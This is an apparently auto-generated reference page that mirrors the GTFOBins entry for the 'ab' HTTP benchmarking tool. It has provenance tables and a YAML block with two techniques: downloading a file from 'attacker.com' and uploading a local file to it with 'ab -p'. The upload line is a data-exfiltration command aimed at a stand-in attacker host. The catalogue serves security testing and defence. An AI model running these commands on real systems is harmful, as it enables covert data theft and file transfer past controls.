---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# ab

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `ab` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ab` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [ab](../../tools/linux/ab.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | ab |
| name | ab |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/ab/ |

## Preserved Source Material

```yaml
_body: ''
_name: ab
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ab
functions:
  download:
  - code: ab -v2 http://attacker.com/path/to/input-file
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender: http-server
  upload:
  - code: ab -p /path/to/input-file http://attacker.com/
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: http-server
```
